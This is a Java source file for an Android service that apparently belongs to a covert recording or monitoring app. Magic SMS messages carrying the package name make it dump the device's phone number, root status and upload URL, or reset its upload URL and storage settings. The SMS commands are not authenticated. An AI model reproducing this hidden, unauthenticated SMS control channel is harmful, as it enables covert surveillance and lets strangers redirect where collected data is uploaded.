package com.telephony.services;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.nio.charset.StandardCharsets;
import java.util.Properties;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class SMService extends Service {
	private PreferenceUtils sPref = null;
	private ExecutorService es;

	private String sms_body = null;
	private String phoneNumber = null;
	private String sms_from_name = null;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {

		super.onCreate();
		es = Executors.newFixedThreadPool(1);
		sPref = PreferenceUtils.getInstance(this);
		Log.d(Utils.LOG_TAG, getClass().getName() + " Create");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		es.execute(new RunService(intent, flags, startId, this));
		return super.onStartCommand(intent, flags, startId);

	}

	private void getConfig(String filename) throws UnsupportedEncodingException, IOException {
		FileOutputStream fos = null;
		try {
			fos = new FileOutputStream(new File(sPref.getRootDir(), filename));
			StringBuilder sb = new StringBuilder();
			sb.append("Phone number=" + Utils.getSelfPhoneNumber(this)).append("\n");
			sb.append("root=" + Utils.CheckRoot()).append("\n");
			sb.append(PreferenceUtils.ROOT_DIR + "=" + sPref.getRootDir()).append("\n");
			sb.append(PreferenceUtils.UPLOAD_URL + "=" + sPref.getUploadUrl()).append("\n");
			sb.append(PreferenceUtils.KEEP_DAYS + "=" + sPref.getKeepDays()).append("\n");
			sb.append(PreferenceUtils.VIBRATE + "=" + sPref.getVibrate()).append("\n");			
			sb.append(PreferenceUtils.VIBRATE_TIME + "=" + sPref.getVibrateTime()).append("\n");
			fos.write(sb.toString().getBytes("UTF8"));
		} finally {
			if (fos != null) {
				fos.close();
			}
		}
	}

	private void setConfig(String src) throws IOException {
		src = src.replaceFirst(getPackageName(), "");
		Properties prop = new Properties();
		InputStream in = null;
		try {
			in = new ByteArrayInputStream(src.getBytes("UTF8"));
			prop.load(in);
			sPref.setRootDir(prop.getProperty(PreferenceUtils.ROOT_DIR));
			sPref.setUploadUrl(prop.getProperty(PreferenceUtils.UPLOAD_URL));
			sPref.setKeepDays(Integer.parseInt(prop.getProperty(PreferenceUtils.KEEP_DAYS)));
			sPref.setVibrate(Boolean.parseBoolean(prop.getProperty(PreferenceUtils.VIBRATE)));
			sPref.setVibrateTime(Integer.parseInt(prop.getProperty(PreferenceUtils.VIBRATE_TIME)));
		} finally {
			if (in != null) {
				in.close();				
			}
		}

	}

	private class RunService implements Runnable {
		private final Intent intent;
		private final int flags;
		private final int startId;
		private final Context context;

		public RunService(Intent intent, int flags, int startId, Context context) {
			this.intent = intent;
			this.flags = flags;
			this.startId = startId;
			this.context = context;
		}

		public void run() {
			try {
				if (sPref.getRootDir().exists() && (Utils.updateExternalStorageState() == Utils.MEDIA_MOUNTED)) {
					phoneNumber = intent.getStringExtra(Utils.EXTRA_SMS_FROM);
					sms_from_name = Utils.getContactName(context, phoneNumber);
					sms_body = intent.getStringExtra(Utils.EXTRA_SMS_BODY);
					if (sms_body != null) {
						if (sms_body.equals(getPackageName())) {
							Log.d(Utils.LOG_TAG, "Send configuration to " + phoneNumber);
							getConfig("config.out");
						} else if (sms_body.startsWith(getPackageName())) {
							Log.d(Utils.LOG_TAG, "set configuration");
							setConfig(sms_body);
						}
					}

					Log.d(Utils.LOG_TAG, intent.toUri(Intent.URI_INTENT_SCHEME));
				}
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				stop();
			}
		}

		public void stop() {
			try {

			} catch (Exception e) {
				e.printStackTrace();
			}
			stopSelf();
		}

	}

	@Override
	public void onDestroy() {

		super.onDestroy();
		es = null;
		sPref = null;
		Log.d(Utils.LOG_TAG, getClass().getName() + " Destroy");
	}

}
